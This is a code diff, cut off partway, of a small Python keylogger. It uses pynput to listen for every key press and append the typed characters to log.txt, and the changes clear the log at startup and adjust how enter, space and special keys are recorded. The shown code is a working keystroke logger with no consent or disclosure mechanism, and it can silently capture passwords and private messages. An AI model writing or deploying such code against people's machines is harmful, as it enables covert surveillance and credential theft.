@@ -1,22 +1,29 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+# Clear text file
+file = open("log.txt", "w+")
+file.truncate(0)
+file.close()
+
 def on_press(key):
     write_file(key)
-  
+
 def write_file(key):
     
     # Create/open text file
     with open("log.txt", "a") as f:
         
-        # Write newline for keys backspace and enter
+        # Write newline for enter key
         if(str(key).find("enter") > 0):
             f.write("\n")
 
-        # Write 
-        elif(str(key).find("space") > 0):
+        # Write space for space and backspace keys
+        if(str(key).find("space") > 0):
             f.write(" ")
-        elif(str(key).find("Key") == -1):    
+        
+        # Write only legible keys
+        if(str(key).find("Key") == -1):    
             f.write(str(key).replace("'", ""))             
         
 def on_release(key):
